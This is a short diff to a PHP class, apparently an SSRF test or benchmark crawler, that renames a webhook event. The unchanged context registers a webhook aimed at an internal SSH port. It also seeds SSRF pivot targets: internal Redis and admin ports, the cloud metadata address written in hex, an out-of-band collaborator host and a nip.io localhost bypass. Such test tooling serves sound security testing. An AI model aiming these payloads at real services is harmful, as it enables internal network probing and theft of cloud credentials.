@@ -162,7 +162,7 @@ final class SsrfPivotCrawler
     {
         $this->h->join('crawler', 'Passw0rd!x', 'crawler', self::IP);
         $this->pat = $this->h->mint(['read:user', 'webhooks:write', 'imports:write', 'storage:write'], 'bench', 'crawler', self::IP, 'Passw0rd!x', 'crawler');
-        $r = $this->send('POST', '/api/v2/user/hooks', '{"content_type":"json","events":["token"],"active":true,"url":"http://127.1:22/"}');
+        $r = $this->send('POST', '/api/v2/user/hooks', '{"content_type":"json","events":["token.created"],"active":true,"url":"http://127.1:22/"}');
         $this->hook = (string) (json_decode($r['body'], true)['id'] ?? '');
         foreach (['127.1:1', '127.1:22', '127.1:6379', '127.1:8080', '127.1:9090', '0xa9fea9fe:80', self::IP . ':8080', 'oob.collab.example.net:443', '127.0.0.1.nip.io:80'] as $seedTarget) {
             $this->seen[$seedTarget] = true;
